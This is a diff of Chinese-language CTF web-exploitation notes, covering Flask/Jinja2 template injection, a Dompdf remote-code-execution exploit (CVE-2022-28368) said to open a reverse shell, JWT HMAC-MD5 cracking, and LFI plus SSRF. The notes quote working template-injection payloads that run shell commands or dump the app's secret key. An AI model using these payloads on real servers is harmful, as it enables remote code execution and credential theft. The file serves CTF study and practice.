@@ -112,7 +112,7 @@ for i in range(300,1000):
 - `().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x6f,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()`
 - `().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ`
 - 例题
-    - [Obligatory](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Obligatory.md)（https://hackmd.io/@Chivato/HyWsJ31dI ）：`{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
+    - [Obligatory](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Obligatory.md)（https://hackmd.io/@Chivato/HyWsJ31dI ）：`{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`。获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
@@ -2450,11 +2450,12 @@ gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
 #cast命令调用合约函数
 ```
 245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
-- CVE-2022-28368 - Dompdf RCE利用。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
+- CVE-2022-28368 - [Dompdf RCE利用](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
 	- `Unable to stream pdf:headers already sent`为dompdf的错误提示。还有另一种方法判断：由dompdf生成出来的pdf的exif Producer字段会写dompdf的版本。
     - 使用php版本的[poc](https://github.com/positive-security/dompdf-rce)：https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Stickers.md
 246. [Marmalade 5](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Marmalade_5.md)
 - jwt MD5_HMAC字典无第三方库爆破
+- john HMAC-MD5字典爆破jwt。 https://github.com/D13David/ctf-writeups/tree/main/nahamcon23/web/marmalade5
 247. [Museum](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Museum.md)
 - 本地文件包含（LFI）+ssrf。
 - fuzz工具[ffuf](https://github.com/ffuf/ffuf)+字典[SecLists](https://github.com/danielmiessler/SecLists/tree/master)（可用来测试文件包含）
